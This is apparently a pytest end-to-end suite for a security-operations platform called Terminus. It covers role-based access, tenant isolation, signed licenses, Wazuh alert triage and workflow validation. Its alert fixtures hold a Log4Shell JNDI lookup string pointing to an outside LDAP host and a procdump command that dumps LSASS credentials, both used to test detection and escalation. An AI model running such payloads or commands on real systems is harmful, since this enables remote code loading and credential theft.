"""End-to-end enterprise integration test suite for Terminus.

Covers:
1. Multi-account RBAC hierarchy and tenant isolation (Admin, Member, Viewer, Cross-Tenant).
2. Cryptographic licensing validation, seat limit enforcement, tampering detection, and upgrade.
3. Alert ingestion, deterministic policy tiers, kill chain staging, incident actions, and report generation.
4. Workflow visual graph validation (cycle detection, dangling edge prevention, duplicate node detection).
"""

from __future__ import annotations

from datetime import UTC, datetime, timedelta
from typing import Any

import pytest
from fastapi.testclient import TestClient

from terminus.config import get_settings
from terminus.licensing.crypto import encode
from terminus.licensing.models import Feature, License, LicenseTier
from terminus.licensing.service import LicenseService
from terminus.models import Workflow, WorkflowEdge, WorkflowNode
from terminus.server.app import create_app


@pytest.fixture
def client() -> TestClient:
    """Fixture providing clean TestClient for FastAPI app."""
    app = create_app()
    return TestClient(app)


def test_multi_account_rbac_and_isolation(client: TestClient) -> None:
    """Verify RBAC permissions and strict tenant isolation across Admin, Member, Viewer, and Foreign Org."""
    # ── 1. Register Accounts ──
    # User A1: Acme Admin
    r = client.post("/auth/register", json={"email": "admin@acme.corp", "password": "Password123!", "display_name": "Acme Admin"})
    assert r.status_code == 201
    user_a1 = r.json()

    # User A2: Acme Member (Operator)
    r = client.post("/auth/register", json={"email": "operator@acme.corp", "password": "Password123!", "display_name": "Acme Operator"})
    assert r.status_code == 201
    user_a2 = r.json()

    # User A3: Acme Viewer (Auditor)
    r = client.post("/auth/register", json={"email": "auditor@acme.corp", "password": "Password123!", "display_name": "Acme Auditor"})
    assert r.status_code == 201
    user_a3 = r.json()

    # User B1: Foreign Org Admin
    r = client.post("/auth/register", json={"email": "foreign@other.corp", "password": "Password123!", "display_name": "Foreign Admin"})
    assert r.status_code == 201
    user_b1 = r.json()

    # ── 2. Login All Users ──
    token_a1 = client.post("/auth/login", json={"email": "admin@acme.corp", "password": "Password123!"}).json()["session_token"]
    token_a2 = client.post("/auth/login", json={"email": "operator@acme.corp", "password": "Password123!"}).json()["session_token"]
    token_a3 = client.post("/auth/login", json={"email": "auditor@acme.corp", "password": "Password123!"}).json()["session_token"]
    token_b1 = client.post("/auth/login", json={"email": "foreign@other.corp", "password": "Password123!"}).json()["session_token"]

    # ── 3. Create Organizations ──
    # Admin A1 creates Acme Corp
    r_acme = client.post("/orgs", headers={"Authorization": f"Bearer {token_a1}"}, json={"name": "Acme Corporation"})
    assert r_acme.status_code == 201
    acme_id = r_acme.json()["org_id"]

    # Admin B1 creates Other Corp
    r_other = client.post("/orgs", headers={"Authorization": f"Bearer {token_b1}"}, json={"name": "Other Corporation"})
    assert r_other.status_code == 201
    other_id = r_other.json()["org_id"]

    headers_a1 = {"Authorization": f"Bearer {token_a1}", "X-Org-ID": acme_id}
    headers_a2 = {"Authorization": f"Bearer {token_a2}", "X-Org-ID": acme_id}
    headers_a3 = {"Authorization": f"Bearer {token_a3}", "X-Org-ID": acme_id}
    headers_b1 = {"Authorization": f"Bearer {token_b1}", "X-Org-ID": other_id}
    headers_b1_invade = {"Authorization": f"Bearer {token_b1}", "X-Org-ID": acme_id}

    # ── 4. Admin adds Member and Viewer to Acme Corp ──
    r_add_m = client.post(f"/orgs/{acme_id}/members", headers=headers_a1, json={"user_id": user_a2["user_id"], "role": "member"})
    assert r_add_m.status_code == 201

    r_add_v = client.post(f"/orgs/{acme_id}/members", headers=headers_a1, json={"user_id": user_a3["user_id"], "role": "viewer"})
    assert r_add_v.status_code == 201

    # Adding unknown user ID fails with 404
    r_unknown = client.post(f"/orgs/{acme_id}/members", headers=headers_a1, json={"user_id": "usr-doesnotexist999", "role": "member"})
    assert r_unknown.status_code == 404

    # ── 5. Member (Operator) Permissions ──
    # Member CAN ingest alert
    alert_payload: dict[str, Any] = {
        "id": "e2e-alert-001",
        "rule": {"id": 5710, "level": 8, "description": "SSH password brute-force attempt"},
        "agent": {"id": "host-01", "name": "prod-bastion-01"},
        "full_log": "sshd: Failed password for root from 192.168.1.100 port 22 ssh2",
        "timestamp": datetime.now(UTC).isoformat(),
    }
    r_ingest = client.post("/wazuh", headers=headers_a2, json=alert_payload)
    assert r_ingest.status_code == 200

    # Member CAN generate quick report
    r_rep = client.post("/reports/quick", headers=headers_a2)
    assert r_rep.status_code == 201

    # Member CANNOT add members (requires Admin)
    r_unauth_add = client.post(f"/orgs/{acme_id}/members", headers=headers_a2, json={"user_id": user_b1["user_id"], "role": "member"})
    assert r_unauth_add.status_code == 403

    # Member CANNOT create agents (requires Admin)
    r_unauth_agent = client.post("/agents", headers=headers_a2, json={"name": "Rogue Agent", "role_description": "X", "master_prompt": "Y"})
    assert r_unauth_agent.status_code == 403

    # ── 6. Viewer (Auditor) Permissions ──
    # Viewer CAN read incidents and reports
    r_view_inc = client.get("/incidents", headers=headers_a3)
    assert r_view_inc.status_code == 200
    assert len(r_view_inc.json()) >= 1

    r_view_rep = client.get("/reports", headers=headers_a3)
    assert r_view_rep.status_code == 200

    # Viewer CANNOT submit alerts (requires Operator)
    r_view_ingest = client.post("/wazuh", headers=headers_a3, json=alert_payload)
    assert r_view_ingest.status_code == 403

    # Viewer CANNOT generate reports
    r_view_gen = client.post("/reports/quick", headers=headers_a3)
    assert r_view_gen.status_code == 403

    # ── 7. Strict Multi-Tenant Isolation ──
    # Foreign user attempting to access Acme Corp returns 403 Forbidden
    r_cross_inc = client.get("/incidents", headers=headers_b1_invade)
    assert r_cross_inc.status_code == 403
    assert "not a member" in r_cross_inc.json()["detail"]

    r_cross_rep = client.get("/reports", headers=headers_b1_invade)
    assert r_cross_rep.status_code == 403

    r_cross_wazuh = client.post("/wazuh", headers=headers_b1_invade, json=alert_payload)
    assert r_cross_wazuh.status_code == 403

    # B1 CAN access their own organization
    r_own_inc = client.get("/incidents", headers=headers_b1)
    assert r_own_inc.status_code == 200

    # ── 8. Admin Safeguards: Last Admin Protection ──
    # Sole admin cannot be removed
    r_del_admin = client.delete(f"/orgs/{acme_id}/members/{user_a1['user_id']}", headers=headers_a1)
    assert r_del_admin.status_code == 409
    assert "last admin" in r_del_admin.json()["detail"].lower()

    # Sole admin cannot be demoted
    r_demote_admin = client.patch(f"/orgs/{acme_id}/members/{user_a1['user_id']}", headers=headers_a1, json={"role": "member"})
    assert r_demote_admin.status_code == 409

    # ── 9. Session Revocation (Logout) ──
    r_logout = client.post("/auth/logout", headers={"Authorization": f"Bearer {token_a3}"})
    assert r_logout.status_code == 200
    assert r_logout.json() == {"status": "logged_out"}

    # Revoked token is rejected on subsequent requests
    r_revoked = client.get("/incidents", headers=headers_a3)
    assert r_revoked.status_code == 401


def test_cryptographic_licensing_and_seat_limits(client: TestClient) -> None:
    """Verify seat limit enforcement, tamper detection, and enterprise tier license upgrade."""
    settings = get_settings()
    lic_service = LicenseService(secret=settings.license_secret)

    # Register admin and create organization
    client.post("/auth/register", json={"email": "lic-admin@license-test.corp", "password": "Password123!", "display_name": "Lic Admin"})
    token = client.post("/auth/login", json={"email": "lic-admin@license-test.corp", "password": "Password123!"}).json()["session_token"]
    res_org = client.post("/orgs", headers={"Authorization": f"Bearer {token}"}, json={"name": "License Testing Corp"})
    org_id = res_org.json()["org_id"]
    headers = {"Authorization": f"Bearer {token}", "X-Org-ID": org_id}

    # Register 3 additional dummy users
    users: list[dict[str, str]] = []
    for i in range(1, 4):
        email = f"seat_user_{i}@license-test.corp"
        r = client.post("/auth/register", json={"email": email, "password": "Password123!", "display_name": f"Seat User {i}"})
        users.append(r.json())

    # ── 1. Default Trial Tier has 3-seat limit (1 creator + 2 added = 3) ──
    r1 = client.post(f"/orgs/{org_id}/members", headers=headers, json={"user_id": users[0]["user_id"], "role": "member"})
    assert r1.status_code == 201

    r2 = client.post(f"/orgs/{org_id}/members", headers=headers, json={"user_id": users[1]["user_id"], "role": "member"})
    assert r2.status_code == 201

    # Adding 4th member exceeds 3-seat limit -> 402 Payment Required
    r3_blocked = client.post(f"/orgs/{org_id}/members", headers=headers, json={"user_id": users[2]["user_id"], "role": "member"})
    assert r3_blocked.status_code == 402
    assert "seat limit" in r3_blocked.json()["detail"].lower()

    # ── 2. License Activation Error Handling ──
    # Malformed token
    r_malformed = client.post(f"/orgs/{org_id}/license", headers=headers, json={"token": "gibberish.not-valid-base64"})
    assert r_malformed.status_code == 400

    # Tampered signature
    foreign_lic_service = LicenseService(secret="different-secret-key-32-chars---")
    forged_token = foreign_lic_service.generate(org_id=org_id, tier=LicenseTier.ENTERPRISE, max_seats=50)
    r_forged = client.post(f"/orgs/{org_id}/license", headers=headers, json={"token": forged_token})
    assert r_forged.status_code == 400
    assert "signature" in r_forged.json()["detail"].lower() or "tamper" in r_forged.json()["detail"].lower()

    # Expired license token
    expired_lic = License(
        id="lic-expired-001",
        org_id=org_id,
        tier=LicenseTier.ENTERPRISE,
        features=[Feature.API_ACCESS, Feature.CUSTOM_RULES],
        issued_at=datetime.now(UTC) - timedelta(days=60),
        expires_at=datetime.now(UTC) - timedelta(days=30),
        max_seats=50,
    )
    expired_token = encode(expired_lic, settings.license_secret)
    r_expired = client.post(f"/orgs/{org_id}/license", headers=headers, json={"token": expired_token})
    assert r_expired.status_code == 400
    assert "expired" in r_expired.json()["detail"].lower()

    # License belonging to a different organization
    wrong_org_token = lic_service.generate(org_id="org-foreign-9999", tier=LicenseTier.ENTERPRISE, max_seats=100)
    r_wrong_org = client.post(f"/orgs/{org_id}/license", headers=headers, json={"token": wrong_org_token})
    assert r_wrong_org.status_code == 400
    assert "does not belong" in r_wrong_org.json()["detail"].lower()

    # ── 3. Upgrade to Valid Enterprise License ──
    enterprise_token = lic_service.generate(
        org_id=org_id,
        tier=LicenseTier.ENTERPRISE,
        days=365,
        max_seats=100,
    )
    r_upgrade = client.post(f"/orgs/{org_id}/license", headers=headers, json={"token": enterprise_token})
    assert r_upgrade.status_code == 200
    upgraded_data = r_upgrade.json()
    assert upgraded_data["tier"] == "enterprise"
    assert upgraded_data["max_seats"] == 100

    # Verify /orgs/current reflects new license tier and capacity
    r_cur = client.get("/orgs/current", headers=headers)
    assert r_cur.status_code == 200
    assert r_cur.json()["license"]["tier"] == "enterprise"
    assert r_cur.json()["license"]["max_seats"] == 100

    # ── 4. Add the 4th member now that seat capacity is expanded ──
    r3_allowed = client.post(f"/orgs/{org_id}/members", headers=headers, json={"user_id": users[2]["user_id"], "role": "member"})
    assert r3_allowed.status_code == 201
    assert r3_allowed.json()["user_id"] == users[2]["user_id"]


def test_threat_ingestion_and_incident_actions(client: TestClient) -> None:
    """Verify threat alert ingestion, deterministic policy tiers, kill chain staging, and action state transitions."""
    # Register and login operator
    client.post("/auth/register", json={"email": "threat-op@soc.corp", "password": "Password123!", "display_name": "Threat Op"})
    token = client.post("/auth/login", json={"email": "threat-op@soc.corp", "password": "Password123!"}).json()["session_token"]
    res_org = client.post("/orgs", headers={"Authorization": f"Bearer {token}"}, json={"name": "Threat Ops SOC"})
    org_id = res_org.json()["org_id"]
    headers = {"Authorization": f"Bearer {token}", "X-Org-ID": org_id}

    # ── 1. Ingest Low Alert (Level 3) -> Policy IGNORE (Noise filtered, no ticket) ──
    low_alert = {
        "id": "alert-low-001",
        "rule": {"id": 1001, "level": 3, "description": "Informational ping audit log"},
        "agent": {"id": "srv-01", "name": "web-edge-01"},
        "full_log": "ICMP ping request processed",
        "timestamp": datetime.now(UTC).isoformat(),
    }
    res_low = client.post("/wazuh", headers=headers, json=low_alert)
    assert res_low.status_code == 200
    rep_low = res_low.json()
    assert rep_low["policy"]["tier"] == "ignore"
    assert rep_low["policy"]["should_investigate"] is False

    # ── 2. Ingest Medium Alert (Level 8) -> Policy TRIAGE ──
    triage_alert = {
        "id": "alert-triage-001",
        "rule": {"id": 5710, "level": 8, "description": "Multiple SSH authentication failures"},
        "agent": {"id": "srv-01", "name": "web-edge-01"},
        "full_log": "sshd: Failed password for invalid user root from 203.0.113.195",
        "timestamp": datetime.now(UTC).isoformat(),
    }
    res_triage = client.post("/wazuh", headers=headers, json=triage_alert)
    assert res_triage.status_code == 200
    rep_triage = res_triage.json()
    assert rep_triage["policy"]["tier"] == "triage"
    assert rep_triage["policy"]["should_investigate"] is True

    # ── 3. Ingest Log4Shell Exploit (Level 12, MITRE T1190) -> Policy ESCALATE ──
    log4j_alert = {
        "id": "alert-log4j-001",
        "rule": {"id": 100001, "level": 12, "description": "Log4Shell JNDI exploit injection attempt", "mitre": {"id": "T1190"}},
        "agent": {"id": "srv-02", "name": "app-backend-01"},
        "full_log": "GET /api/search?q=${jndi:ldap://198.51.100.23/exploit} HTTP/1.1",
        "timestamp": datetime.now(UTC).isoformat(),
    }
    res_log4j = client.post("/wazuh", headers=headers, json=log4j_alert)
    assert res_log4j.status_code == 200
    rep_log4j = res_log4j.json()
    assert rep_log4j["policy"]["tier"] == "escalate"

    # ── 4. Ingest LSASS Credential Dump (Level 14, MITRE T1003) -> Policy ESCALATE ──
    lsass_alert = {
        "id": "alert-lsass-001",
        "rule": {"id": 100002, "level": 14, "description": "Suspicious process handle to LSASS memory", "mitre": {"id": "T1003"}},
        "agent": {"id": "srv-03", "name": "dc-primary-01"},
        "full_log": "procdump.exe -ma lsass.exe c:\\temp\\lsass.dmp",
        "timestamp": datetime.now(UTC).isoformat(),
    }
    res_lsass = client.post("/wazuh", headers=headers, json=lsass_alert)
    assert res_lsass.status_code == 200
    rep_lsass = res_lsass.json()
    assert rep_lsass["policy"]["tier"] == "escalate"

    # ── 5. Verify Incidents Created & Staging (3 tickets for Triage + 2 Escalate; 0 for Ignore) ──
    res_incidents = client.get("/incidents", headers=headers)
    assert res_incidents.status_code == 200
    incidents = res_incidents.json()
    assert len(incidents) == 3

    log4j_incident = next(i for i in incidents if i["alert_id"] == "alert-log4j-001")
    assert log4j_incident["kill_chain_stage"] == "Initial Access"
    assert log4j_incident["status"] == "OPEN"

    lsass_incident = next(i for i in incidents if i["alert_id"] == "alert-lsass-001")
    assert lsass_incident["kill_chain_stage"] == "Credential Access"

    # ── 5. Incident Action Lifecycle ──
    ticket_id = log4j_incident["id"]

    # Mark Investigating
    r_inv = client.post(f"/incidents/{ticket_id}/action", headers=headers, json={"action_type": "start_investigation"})
    assert r_inv.status_code == 200
    assert r_inv.json()["ticket"]["status"] == "INVESTIGATING"

    # Close Ticket (Resolved)
    r_close = client.post(f"/incidents/{ticket_id}/action", headers=headers, json={"action_type": "close_ticket"})
    assert r_close.status_code == 200
    assert r_close.json()["ticket"]["status"] == "RESOLVED"
    assert r_close.json()["ticket"]["resolved_at"] != ""

    # Reopen Ticket
    r_reopen = client.post(f"/incidents/{ticket_id}/action", headers=headers, json={"action_type": "reopen_ticket"})
    assert r_reopen.status_code == 200
    assert r_reopen.json()["ticket"]["status"] == "OPEN"

    # Unsupported Action returns 501 Not Implemented
    r_unsupported = client.post(f"/incidents/{ticket_id}/action", headers=headers, json={"action_type": "isolate_host"})
    assert r_unsupported.status_code == 501
    assert "response connector" in r_unsupported.json()["detail"].lower()

    # ── 6. Metrics Summary ──
    res_metrics = client.get("/metrics/summary", headers=headers)
    assert res_metrics.status_code == 200
    metrics = res_metrics.json()
    assert metrics["total_incidents_processed"] >= 3

    # ── 7. Reports Generation ──
    res_quick = client.post("/reports/quick", headers=headers)
    assert res_quick.status_code == 201
    quick_rep = res_quick.json()
    assert quick_rep["report_type"] == "quick"
    assert quick_rep["metrics"]["total_incidents"] >= 3
    assert len(quick_rep["top_impacted_hosts"]) >= 1

    res_daily = client.post("/reports/daily", headers=headers)
    assert res_daily.status_code == 201
    daily_rep = res_daily.json()
    assert daily_rep["report_type"] == "daily_24h"


def test_workflow_graph_validation_and_execution(client: TestClient) -> None:
    """Verify workflow graph validation: cycle rejection, node ID uniqueness, and test execution."""
    client.post("/auth/register", json={"email": "wf-admin@flow.corp", "password": "Password123!", "display_name": "Flow Admin"})
    token = client.post("/auth/login", json={"email": "wf-admin@flow.corp", "password": "Password123!"}).json()["session_token"]
    res_org = client.post("/orgs", headers={"Authorization": f"Bearer {token}"}, json={"name": "Flow Automation Corp"})
    org_id = res_org.json()["org_id"]
    headers = {"Authorization": f"Bearer {token}", "X-Org-ID": org_id}

    # ── 1. Empty name rejection ──
    wf_bad_name = Workflow(
        id="wf-bad-name",
        name="  ",
        nodes=[WorkflowNode(id="n1", type="trigger_wazuh", label="Webhook")],
        edges=[],
    )
    r_bad_name = client.post("/workflows", headers=headers, json=wf_bad_name.model_dump())
    assert r_bad_name.status_code == 422
    assert "name is required" in r_bad_name.json()["detail"].lower()

    # ── 2. Duplicate node IDs rejection ──
    wf_dup_nodes = Workflow(
        id="wf-dup-nodes",
        name="Duplicate Node IDs Workflow",
        nodes=[
            WorkflowNode(id="n1", type="trigger_wazuh", label="Webhook"),
            WorkflowNode(id="n1", type="agent_llm", label="Investigator"),
        ],
        edges=[],
    )
    r_dup_nodes = client.post("/workflows", headers=headers, json=wf_dup_nodes.model_dump())
    assert r_dup_nodes.status_code == 422
    assert "unique" in r_dup_nodes.json()["detail"].lower()

    # ── 3. Dangling edges rejection (target does not exist) ──
    wf_dangling = Workflow(
        id="wf-dangling",
        name="Dangling Edge Workflow",
        nodes=[WorkflowNode(id="n1", type="trigger_wazuh", label="Webhook")],
        edges=[WorkflowEdge(id="e1", source="n1", target="non-existent-node")],
    )
    r_dangling = client.post("/workflows", headers=headers, json=wf_dangling.model_dump())
    assert r_dangling.status_code == 422
    assert "existing nodes" in r_dangling.json()["detail"].lower()

    # ── 4. Cycle rejection (A -> B -> C -> A) ──
    wf_cycle = Workflow(
        id="wf-cycle",
        name="Cyclic Workflow",
        nodes=[
            WorkflowNode(id="n1", type="trigger_wazuh", label="Node 1"),
            WorkflowNode(id="n2", type="condition_severity", label="Node 2"),
            WorkflowNode(id="n3", type="agent_llm", label="Node 3"),
        ],
        edges=[
            WorkflowEdge(id="e1", source="n1", target="n2"),
            WorkflowEdge(id="e2", source="n2", target="n3"),
            WorkflowEdge(id="e3", source="n3", target="n1"),
        ],
    )
    r_cycle = client.post("/workflows", headers=headers, json=wf_cycle.model_dump())
    assert r_cycle.status_code == 422
    assert "cycles are not supported" in r_cycle.json()["detail"].lower()

    # ── 5. Valid Directed Acyclic Graph (DAG) Creation ──
    wf_valid = Workflow(
        id="wf-valid-dag",
        name="Valid Enterprise Containment DAG",
        nodes=[
            WorkflowNode(id="n1", type="trigger_wazuh", label="Wazuh Webhook", x=0, y=100),
            WorkflowNode(id="n2", type="condition_severity", label="Severity Filter", x=250, y=100),
            WorkflowNode(id="n3", type="agent_llm", label="Investigator LLM", x=500, y=100),
            WorkflowNode(id="n4", type="tool_slack", label="Slack Dispatcher", x=750, y=100),
        ],
        edges=[
            WorkflowEdge(id="e1", source="n1", target="n2"),
            WorkflowEdge(id="e2", source="n2", target="n3"),
            WorkflowEdge(id="e3", source="n3", target="n4"),
        ],
    )
    r_valid = client.post("/workflows", headers=headers, json=wf_valid.model_dump())
    assert r_valid.status_code == 201

    # ── 6. Execute Workflow Validation ──
    r_exec = client.post(f"/workflows/{wf_valid.id}/execute", headers=headers)
    assert r_exec.status_code == 200
    exec_data = r_exec.json()
    assert exec_data["status"] == "validated"
    assert exec_data["nodes_validated"] == 4

    # ── 7. Delete Workflow ──
    r_del = client.delete(f"/workflows/{wf_valid.id}", headers=headers)
    assert r_del.status_code == 204
